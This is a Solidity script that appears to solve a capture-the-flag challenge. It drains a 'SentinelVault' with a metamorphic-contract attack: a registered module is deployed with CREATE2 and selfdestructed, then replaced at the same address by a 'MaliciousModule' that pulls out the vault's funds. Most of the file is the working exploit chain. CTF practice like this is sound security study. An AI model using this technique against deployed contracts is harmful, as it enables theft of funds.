// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import 'forge-ctf/CTFSolver.sol';

import 'src/Challenge.sol';
import 'src/SentinelVault.sol';
import 'src/EchoModule.sol';
import 'script/exploit/Exploit.sol';

contract Solve is CTFSolver {
    function solve(address challengeAddress, address player) internal override {
        Challenge challenge = Challenge(challengeAddress);
        SentinelVault vault = challenge.VAULT();
        bytes32 salt = bytes32(uint256(1));

        MetamorphicFactory factory = new MetamorphicFactory();
        EchoModule echoRef = new EchoModule();
        factory.setImplementation(address(echoRef));

        // CREATE2 deploy + register + selfdestruct in one tx (EIP-6780)
        ExploitHelper helper = new ExploitHelper();
        address moduleAddr = helper.deployRegisterDestroy(factory, vault, salt);

        // Forge simulation workaround: selfdestruct finalizes at tx boundary
        vm.etch(moduleAddr, '');
        vm.resetNonce(moduleAddr);

        // Redeploy at same address with malicious code
        MaliciousModule maliciousRef = new MaliciousModule();
        factory.setImplementation(address(maliciousRef));
        address redeployed = factory.deploy(salt);

        MaliciousModule(redeployed).drain(vault, player);

        require(challenge.isSolved(), 'Challenge not solved');
    }
}
